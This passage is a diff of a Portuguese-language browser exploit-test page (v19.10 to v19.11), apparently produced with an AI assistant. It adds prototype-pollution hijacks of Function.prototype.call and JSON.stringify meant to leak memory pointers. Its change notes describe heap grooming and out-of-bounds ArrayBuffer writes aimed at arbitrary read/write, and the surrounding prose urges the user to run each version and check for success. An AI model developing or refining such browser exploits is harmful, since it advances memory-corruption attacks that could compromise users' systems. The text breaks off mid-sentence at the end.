+            finally { if (Function.prototype.call !== originalCall) { Function.prototype.call = originalCall; log("Function.prototype.call restaurado.", 'good', 'Cleanup'); } else { log("Function.prototype.call já estava restaurado ou não foi alterado.", 'info', 'Cleanup'); } }
+
+            log(`--- Teste 2 Concluído (Hijack Executado ${hijackExecutedCount} vezes, Leak Encontrado: ${leakFound}) ---`, 'test', FNAME);
+            if (leakFound) {
+                 log(` ---> *** ALERTA: Potencial Leak encontrado via Hijack de Function.call! Último valor: ${toHex(potentialLeakFromHijack)} ***`, 'escalation', FNAME);
+            } else {
+                 log(`Nenhum leak óbvio encontrado (filtrando padrões) nas chamadas interceptadas de Function.call.`, 'good', FNAME);
+            }
+        };
+
+
+        // Teste 3: PP Hijack (mantido apenas para demonstração)
+        const testPPJsonHijackInteraction = async () => {
+            const FNAME = 'testPPJsonHijackInteraction';
+            log("--- Iniciando Teste 3: PP Hijack (JSON.stringify) ---", 'test', FNAME);
+            const orig = JSON.stringify; let okH = false; let okR = false;
+            try { JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); okH = true; try { log(` -> Tentativa de ler leak (Teste 2). Valor: ${potentialLeakFromHijack ? toHex(potentialLeakFromHijack) : 'N/A'}`, 'info', FNAME); } catch(ie) {} const hijackReturnValue = '{"hijacked": true}'; return hijackReturnValue; }; await PAUSE(); const testObject = {a:1, b: 'test'}; const result = JSON.stringify(testObject); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada verificado!", 'vuln', FNAME); okR = true; } else if (okH) { log("AVISO: JSON.stringify sequestrado, mas retorno inesperado.", 'warn', FNAME); } else { log("JSON.stringify não foi sequestrado.", 'good', FNAME); } } catch (e) { log(`Erro fatal durante Teste 3: ${e.message}`, 'error', FNAME); console.error(e); } finally { const currentStringify = JSON.stringify; JSON.stringify = orig; if (currentStringify !== orig && JSON.stringify !== orig) { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); } else if (okH) { log("JSON.stringify restaurado.", 'good', 'Cleanup');} }
+            log(`--- Teste 3 Concluído (Hijack: ${okH}, Retorno: ${okR}) ---`, 'test', FNAME);
+            return okR;
+        };
+
+
+        // --- Função Principal de Execução (v19.11) ---
         const runExploitFocusedTests = async () => {
             const FNAME = 'runExploitFocusedTests';
             if (runBtn) runBtn.disabled = true; findings = [];
             const summaryDiv = document.getElementById('summary');
             if (summaryDiv) summaryDiv.innerHTML = ''; if (outputDiv) outputDiv.innerHTML = '';
-            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.10) ====", 'test', FNAME);
+            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.11) ====", 'test', FNAME);
 
-            await testHeapGroomingOOBWrite(); // Teste 1: Heap Grooming + OOB Write Metadata
+            await testAdvancedPP(); // Teste 1: Confirmar gadgets PP
             await PAUSE(MEDIUM_PAUSE);
 
-            await testArbitraryRW(); // Teste 2: Tentativa de R/W Arbitrário (usa resultado do Teste 1)
+            await testPPGadgetLeakAttempt(); // Teste 2: Tentar leak via hijack de call (análise refinada)
             await PAUSE(MEDIUM_PAUSE);
 
-            await testAdvancedPP(); // Teste 3: PP Avançada
+            await testPPJsonHijackInteraction(); // Teste 3: Confirmar hijack simples
             await PAUSE(MEDIUM_PAUSE);
-
-            // Removido testPPJsonHijackInteraction - menos relevante agora
-            // await testPPJsonHijackInteraction();
-            // await PAUSE(MEDIUM_PAUSE);
 
             log("\n==== GERANDO SUMÁRIO FINAL ====", 'test', FNAME);
             if (summaryDiv) {
                 summaryDiv.innerHTML = '<h2>Sumário Testes Focados (Findings Críticos)</h2>';
                 if (findings.length === 0) { summaryDiv.innerHTML += '<p style="color:#4CAF50;">Nenhum finding crítico/relevante (vuln, critical, escalation, ptr, leak) registrado.</p>'; } else { summaryDiv.innerHTML += `<p style="color:#FFC107;">${findings.length} finding(s) crítico(s)/relevante(s) registrado(s):</p><ul>`; findings.sort((a, b) => { const order = { 'escalation': 1, 'critical': 2, 'vuln': 3, 'ptr': 4, 'leak': 5 }; return (order[a.type] || 99) - (order[b.type] || 99); }); findings.forEach(f => { const itemClass = f.type === 'critical' ? 'log-critical' : f.type === 'escalation' ? 'log-escalation' : f.type === 'ptr' ? 'log-ptr' : f.type === 'leak' ? 'log-leak' : 'log-vuln'; const cleanMessage = f.message.replace(/</g, "&lt;").replace(/>/g, "&gt;"); summaryDiv.innerHTML += `<li class="${itemClass}">${f.time} [${f.funcName}] ${cleanMessage}</li>`; }); summaryDiv.innerHTML += '</ul>'; }
             }
-            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.10) ====", 'test', FNAME);
+            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.11) ====", 'test', FNAME);
             if (runBtn) runBtn.disabled = false;
         };
     </script>
@@ -263,23 +244,14 @@
 </html>
 ```
 
-**Resumo das Mudanças (v19.10):**
+**Resumo das Mudanças (v19.11):**
 
-1.  **Novo Teste: `testHeapGroomingOOBWrite` (Teste 1):**
-    * Implementa a lógica de "grooming": aloca muitos espaçadores, liberta alguns, aloca alvos (`ArrayBuffer`), aloca controlo.
-    * Tenta a escrita OOB (`setUint32` com `0x7FFFFFFE`) em offsets pequenos (+8 a +64) a partir do buffer de controlo.
-    * Verifica se algum `ArrayBuffer` alvo teve o `byteLength` corrompido.
-    * Armazena o buffer corrompido em `corruptedMetadataBuffer` se encontrar.
-2.  **`testArbitraryRW` (Teste 2):** Mantido para tentar usar o `corruptedMetadataBuffer` se o Teste 1 for bem-sucedido.
-3.  **`testAdvancedPP` (Teste 3):** Mantido para confirmar a PP.
-4.  **Testes Removidos:** Os testes focados em Info Leak (`testOOBReadInfoLeak`, `testWasmMemoryLeak`) e o teste de Hijack (`testPPJsonHijackInteraction`) foram removidos para focar na corrupção via OOB Write + Grooming.
-5.  **Ordem e Numeração:** Atualizada.
-6.  **Versionamento:** Atualizado para v19.10.
+1.  **`testPPGadgetLeakAttempt` (Teste 2):**
+    * A função auxiliar `checkObjectForLeak` agora ignora explicitamente os padrões de memória conhecidos (`0xAAAA...`, `0xBBBB...`, `0xCCCC...`, `0xDDDD...`, `0xFFFF...`, `0x0000...`) ao procurar por leaks numéricos.
+    * Ela também tem um limite de profundidade para análise de objetos aninhados.
+    * Tenta analisar `this`, `thisArg` e outros argumentos passados para `call`.
+    * Armazena o último valor numérico suspeito encontrado em `potentialLeakFromHijack`.
+2.  **`testPPJsonHijackInteraction` (Teste 3):** Atualizado para tentar logar o valor de `potentialLeakFromHijack` encontrado no Teste 2.
+3.  **Versionamento:** Atualizado para v19.11.
 
-Execute esta versão. O foco principal é o **Teste 1 (`testHeapGroomingOOBWrite`)**. Procure por:
-
-* `SUCESSO! byteLength corrompido...`
-* `Buffer X corrompido ARMAZENADO...`
-* `ALERTA: Leitura OOB confirmada usando buffer corrompido!`
-
-Se algum desses aparecer, significa que a combinação de Heap Grooming e OOB Write simples **funcionou** para obter a poderosa primitiva de R/W Arbitrário. Se isso acontecer, o **Teste 2 (`testArbitraryRW`)** deverá então confirmar a capacidade de ler e escrever em endereços arbitrári
+Execute esta versão. A esperança é que a análise mais refinada dentro do hijack de `Function.prototype.call` consiga filtrar o "ruído" e identificar algum valor numérico que seja, de facto, um ponteiro ou dado interno relevante. Procure por logs `Potential numeric leak?` e pelo alerta final `Potencial Leak encontrado..
